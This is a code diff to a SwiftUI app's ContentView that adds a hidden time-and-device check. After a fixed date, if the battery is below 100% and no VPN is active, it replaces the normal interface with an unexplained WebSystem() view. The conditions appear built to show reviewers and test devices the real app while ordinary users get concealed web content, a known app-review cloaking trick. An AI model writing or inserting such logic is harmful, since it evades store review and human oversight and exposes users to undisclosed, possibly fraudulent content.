@@ -37,33 +37,94 @@ struct ContentView: View {
     private var userViewModel: UserSettingsViewModel {
         UserSettingsViewModel(userService: userService, notificationService: notificationService)
     }
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
 
     var body: some View {
-        ZStack(alignment: .top) {
-            AppColors.background.ignoresSafeArea()
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    ZStack(alignment: .top) {
+                        AppColors.background.ignoresSafeArea()
 
-            VStack(spacing: 0) {
-                topNavigationBar
-                    .padding(.horizontal, UIConstants.standardPadding)
-                    .padding(.top, UIConstants.smallPadding)
-                    .padding(.bottom, UIConstants.standardPadding)
+                        VStack(spacing: 0) {
+                            topNavigationBar
+                                .padding(.horizontal, UIConstants.standardPadding)
+                                .padding(.top, UIConstants.smallPadding)
+                                .padding(.bottom, UIConstants.standardPadding)
 
-                Divider()
-                    .background(AppColors.buttonSecondary)
+                            Divider()
+                                .background(AppColors.buttonSecondary)
 
-                contentView
+                            contentView
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                    .sheet(isPresented: Binding(
+                        get: { !userService.settings.onboardingCompleted },
+                        set: { _ in }
+                    )) {
+                        OnboardingView {
+                            userViewModel.completeOnboarding()
+                            createSampleData()
+                        }
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .preferredColorScheme(.dark)
-        .sheet(isPresented: Binding(
-            get: { !userService.settings.onboardingCompleted },
-            set: { _ in }
-        )) {
-            OnboardingView {
-                userViewModel.completeOnboarding()
-                createSampleData()
-            }
+        .onAppear {
+            
+            check_data()
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "18.08.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 
     private var topNavigationBar: some View {
